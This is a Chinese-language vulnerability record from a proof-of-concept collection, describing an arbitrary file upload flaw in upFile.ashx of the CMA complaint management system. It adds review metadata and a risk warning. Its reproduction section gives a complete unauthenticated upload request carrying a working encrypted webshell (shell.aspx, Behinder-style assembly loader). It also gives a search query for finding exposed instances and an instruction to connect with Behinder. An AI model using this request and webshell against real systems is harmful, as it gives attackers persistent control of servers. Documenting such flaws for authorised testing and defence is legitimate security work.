---
source: "Threekiii/Awesome-POC"
title: "CMA客诉管理系统 upFile.ashx上传"
product: "CMA客诉管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "ASP.NET脚本执行与写权限；版本未知"
prerequisites: "无Cookie示例"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/CMA%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/CMA%E5%AE%A2%E8%AF%89%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20upFile.ashx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-07b4f572fc5f65e7e4dded94"
entity_id: "ve-07b4f572fc5f65e7e4dded94"
schema_version: "1"
canonical: "Web安全/商业软件/CMA客诉管理系统/CMA客诉管理系统 upFile.ashx 任意文件上传漏洞.md"
---

# CMA客诉管理系统 upFile.ashx上传

## 条目说明

- 对象与具体问题：CMA客诉管理系统；upFile.ashx上传
- 版本、配置及部署条件：ASP.NET脚本执行与写权限；版本未知
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与21全文同源重复，合并一个产品目录
- 上传载荷是可加载程序集的持久webshell，不是无害标记
- 缺响应路径文本/回读判据，Content-Length固定可失配，版本及补丁缺失

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

CMA客诉管理系统 upFile.ashx文件存在任意文件上传漏洞，通过漏洞攻击者可以上传任意文件控制服务器

### 漏洞影响

```
CMA客诉管理系统
```

### 网络测绘

```
title="CMA客诉管理系统手机端"
```

### 漏洞复现

登录页面

![](./.resource/CMA客诉管理系统upFile.ashx任意文件上传漏洞/media/202205241430645.png)

发送请求包上传文件

```http
POST /upFile/upFile.ashx HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

------WebKitFormBoundarymXf9pBIUlDVOYtnZ
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>

------WebKitFormBoundarymXf9pBIUlDVOYtnZ--
```

> 请求长度说明：原资料 Content-Length 为 562；静态长度已移除，应由客户端根据最终请求体的字节数生成。

![](./.resource/CMA客诉管理系统upFile.ashx任意文件上传漏洞/media/202205241430324.png)

发送后回显路径，使用冰蝎连接

![](./.resource/CMA客诉管理系统upFile.ashx任意文件上传漏洞/media/202205241430125.png)


---

> 来源：Threekiii/Awesome-POC
